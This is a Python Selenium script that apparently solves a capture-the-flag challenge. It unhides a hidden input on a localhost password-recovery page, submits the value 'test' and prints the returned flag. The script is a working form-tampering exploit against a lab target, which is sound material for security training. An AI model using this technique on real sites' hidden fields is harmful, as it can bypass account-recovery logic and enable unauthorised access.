from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Setup WebDriver for Firefox
driver = webdriver.Firefox()

try:
    # Step 1: Open the web page
    driver.get("http://localhost:8080/index.php?page=recover")

    # Step 2: Locate the hidden input field using its new CSS selector and modify its type
    hidden_input = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, '#main > div:nth-child(1) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(2) > form:nth-child(1) > input:nth-child(1)'))
    )
    
    # Remove 'hidden' attribute and clear any existing text
    driver.execute_script("arguments[0].removeAttribute('type')", hidden_input)
    hidden_input.clear()  # Clear any existing text in the input field

    # Step 3: Input the text 'test' into the now visible input field
    hidden_input.send_keys("test")

    # Step 4: Find and click the submit button
    submit_button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, "#main > div:nth-child(1) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(2) > form:nth-child(1) > input[type=submit]"))
    )
    submit_button.click()

    # Step 5: Wait for the result to load and find the desired element
    result_text = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "#main > div:nth-child(1) > center:nth-child(1) > h2:nth-child(1)"))
    )

    # Step 6: Retrieve the text from the element
    flag_text = result_text.text
    print("Flag Text:", flag_text)

except Exception as e:
    print(f"An error occurred: {e}")

finally:
    # Step 7: Close the browser
    driver.quit()
